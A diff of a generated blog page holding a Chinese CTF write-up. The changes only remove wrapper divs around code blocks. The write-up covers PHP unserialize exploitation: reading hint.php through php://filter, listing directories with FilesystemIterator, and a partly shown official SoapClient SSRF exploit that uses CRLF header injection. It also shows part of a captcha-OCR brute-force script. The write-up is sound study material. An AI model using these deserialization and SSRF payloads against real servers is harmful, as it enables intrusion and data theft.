-unserialize($hack);</code></pre></div>
+unserialize($hack);</code></pre>
 <p>首先<code>__wakeup</code>里用伪协议读取<code>hint.php</code></p>
 <p><code>$this-&gt;par2=php://filter/read=convert.base64-encode/resource=./</code></p>
 <p><code>hint.php</code> </p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
 $hint = <span class="hljs-string">&#x27;向管理员的页面post一个参数message(告诉他，&quot;iwantflag&quot;) 和 另一个参数 url（它会向这个url发送一个flag&#x27;</span>;
 $hint .= <span class="hljs-string">&#x27;管理员的页面在当前目录下一个特殊文件夹里&#x27;</span>;
-$hint .= <span class="hljs-string">&#x27;但是我不知道（你也猜不到的）文件夹名称和管理员页面的名称，更坏的消息是只能从127.0.0.1去访问，你能想个办法去看看（别扫 扫不出来!!!)&#x27;</span>;</code></pre></div>
+$hint .= <span class="hljs-string">&#x27;但是我不知道（你也猜不到的）文件夹名称和管理员页面的名称，更坏的消息是只能从127.0.0.1去访问，你能想个办法去看看（别扫 扫不出来!!!)&#x27;</span>;</code></pre>
 <p>通过<code>newOne()</code>使用原生类<code>FilesystemIterator</code>读取目录</p>
 <p>读取两次</p>
 <p><code>/aaaaaaaaaaafxadwagaefae/UcantGuess.php</code></p>
 <p>然后<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112012339716.png" srcset="/img/loading.gif"><br>这个只能读一行，只有个<code>&lt;?php</code></p>
 <p>接下来<code>SoapClient打SSRF</code></p>
 <p>官方exp:</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fxxk</span></span>&#123;
 <span class="hljs-keyword">public</span> $par0;
 <span class="hljs-keyword">public</span> $par1;
@@ -848,11 +856,11 @@ $payload4 = <span class="hljs-keyword">new</span> fxxk(<span class="hljs-string"
 <span class="hljs-string">&#x27;wupco&#x27;</span>.<span class="hljs-string">&#x27;!!&#x27;</span>.<span class="hljs-string">&#x27;Content-Type:&#x27;</span>.<span class="hljs-string">&#x27;Application/X-WWW-Form-Urlencoded&#x27;</span>.<span class="hljs-string">&#x27;!!&#x27;</span>.<span class="hljs-string">&#x27;Content-Length:&#x27;</span>.(<span class="hljs-keyword">string</span>)strlen($postdata).<span class="hljs-string">&#x27;!!!!&#x27;</span>.$postdata.<span class="hljs-string">&#x27;!!&#x27;</span>,<span class="hljs-string">&#x27;uri&#x27;</span> =&gt;
 <span class="hljs-string">&#x27;baaa&#x27;</span>),<span class="hljs-string">&#x27;unser&#x27;</span>);
 $soa = str_replace(<span class="hljs-string">&#x27;!!&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,serialize($payload4));
-<span class="hljs-keyword">echo</span>(urlencode($soa));</code></pre></div>
+<span class="hljs-keyword">echo</span>(urlencode($soa));</code></pre>
 <p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112012348807.png" srcset="/img/loading.gif"></p>
 <h2 id="validation"><a href="#validation" class="headerlink" title="validation"></a>validation</h2><p>验证码ocr</p>
 <p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112020019531.png" srcset="/img/loading.gif"></p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> os
 <span class="hljs-keyword">import</span> time
 <span class="hljs-keyword">import</span> re
 <span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
@@ -897,7 +905,7 @@ onnxruntime.set_default_logger_severity(<span class="hljs-number">3</span>)
     <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
         res = sess.get(url)
         validate(res.text)
-        time.sleep(<span class="hljs-number">2</span>)</code></pre></div>
+        time.sleep(<span class="hljs-number">2</span>)</code></pre>
 
 <p>不过这个脚本运行报错，等之后看看吧</p>
 
@@ -1057,6 +1065,8 @@ onnxruntime.set_default_logger_severity(<span class="hljs-number">3</span>)
 
 
 
+  
+    
   
 
 
